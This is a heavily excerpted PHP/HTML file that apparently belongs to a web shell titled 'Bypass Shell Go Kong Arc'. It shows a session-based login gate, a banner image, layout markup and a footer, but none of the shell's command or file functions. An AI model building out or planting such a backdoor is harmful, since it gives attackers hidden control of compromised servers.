...
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    ...
    <div class="login-card">
        <h1>Bypass Shell Go Kong Arc</h1>
        <img src="https://res.cloudinary.com/dpikvjsib/image/upload/v1751720094/sungokong_aqlsfu.jpg" alt="Banner Image" class="img-fluid">
        <form method="post">
...
<head>
    ...
    <title>Bypass Shell Go Kong Arc</title>
...
<body>
    <div class="container mt-5">
        ...
        <h1 class="mb-4 text-center">Bypass Shell Go Kong Arc</h1>
        <div class="text-center mb-4">
            <img src="https://res.cloudinary.com/dpikvjsib/image/upload/v1751720094/sungokong_aqlsfu.jpg" alt="Welcome Image" class="img-fluid">
        </div>
        <div class="text-center mb-4">
        ...
        <footer class="text-center mt-4">
            <small>© <?php echo date("Y"); ?> Bypass Shell Go Kong Arc</small>
        </footer>
        <?php else: ?>
